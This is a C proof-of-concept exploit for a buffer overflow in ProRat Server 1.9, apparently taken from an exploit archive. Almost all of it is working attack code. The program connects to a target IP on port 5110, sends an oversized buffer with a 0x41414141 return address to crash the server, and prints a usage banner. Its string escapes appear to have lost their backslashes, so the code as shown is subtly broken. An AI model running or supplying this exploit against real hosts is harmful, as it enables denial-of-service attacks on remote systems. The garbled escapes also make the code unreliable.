 /* if this worked for you send me an email.
/str0ke */

/******************************************************************************************

ProRat Server Buffer Overflow Crash POC
http://www.prorat.net/products.php?product=ProRat

Discovered and Coded by evil dabus
e-mail: evil_dabus [at] yahoo.com

Tested on ProRat Server version 1.9 (Fix-2) Public Edition
on a Windows XP Professional sp2 operating system.

This exploit connects to the ProRat server (default port 5110) and sends
a long null command string.
After the exploit send, the ProRat Server will crash, trying to access
to a bad memory address: 0x41414141.
Remote users are able to cause the server to crash or potentially
execute arbitrary code.

*******************************************************************************************/

#include <windows.h>
#include <winsock.h>
#include <stdio.h>

#define BUFSIZE 0x280
#define NOP 0x90
#define PORT 5110 // default port
#define RET_ADDR "x41x41x41x41" // crash
#define NULL_PING_COMMAND "x30x30x30x30x30x30"

void
banner() {
printf("- ProRat v1.9:Fix-2 remote buffer overflow ");
printf("- Coded by evil dabus (evil_dabus [at] yahoo.com) ");
}
void
usage(char *prog) {
banner();

printf("- Usage: %s <target ip> [target port] ", prog);
printf(" ");

exit(1);
}

void
main(int argc, char *argv[])
{
WSADATA wsaData;
struct hostent *pTarget;
struct sockaddr_in sock;
SOCKET s;
int iPort = PORT;
char szRecvBuf[BUFSIZE+1];
char szExpBuff[BUFSIZE];

if (argc < 2) usage(argv[0]);
if (argc==3) iPort = atoi(argv[2]);

printf(" [+] Initialize windows sockets.");
if (WSAStartup(MAKEWORD(2,0), &wsaData) < 0) {
printf(" [-] WSAStartup failed! Exiting...");
return;
}

printf(" [+] Initialize socket.");
s = socket(AF_INET, SOCK_STREAM , 0);
if(s == INVALID_SOCKET){
printf(" [-] Error socket. Exiting...");
exit(1);
}

printf(" [+] Resolving host info.");
if ((pTarget = gethostbyname(argv[1])) == NULL) {
printf(" [-] Resolve of %s failed.", argv[1]);
exit(1);
}
memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
sock.sin_family = AF_INET;
sock.sin_port = htons(iPort);

printf(" [+] Prepare exploit buffer... ");
memset(szExpBuff,NOP,BUFSIZE);
memcpy(szExpBuff,NULL_PING_COMMAND,sizeof(NULL_PING_COMMAND)-1);
memcpy(szExpBuff+576,RET_ADDR,sizeof(RET_ADDR)-1);

printf(" [+] Connecting to %s:%d ... ", argv[1],iPort);
if ( (connect(s, (struct sockaddr *)&sock, sizeof (sock) ))){
printf(" [-] Sorry, cannot connect to %s:%d. Try again...", argv[1],iPort);
exit(1);
}

printf(" [+] OK.");
if ( recv(s, szRecvBuf, BUFSIZE+1, 0) == 0 ) {
printf(" [-] Error response server. Exiting...");
exit(1);
}

Sleep(1000);
printf(" [+] Sending exploit buffer. size: %d",sizeof(szExpBuff));
if (send(s,szExpBuff, sizeof(szExpBuff)+1, 0) == -1){
printf(" [-] Send failed. Exiting...");
exit(1);
}

Sleep(1000);
printf(" [+] OK. ");
printf(" [*] Now try to connect to the server");

closesocket(s);
WSACleanup();
}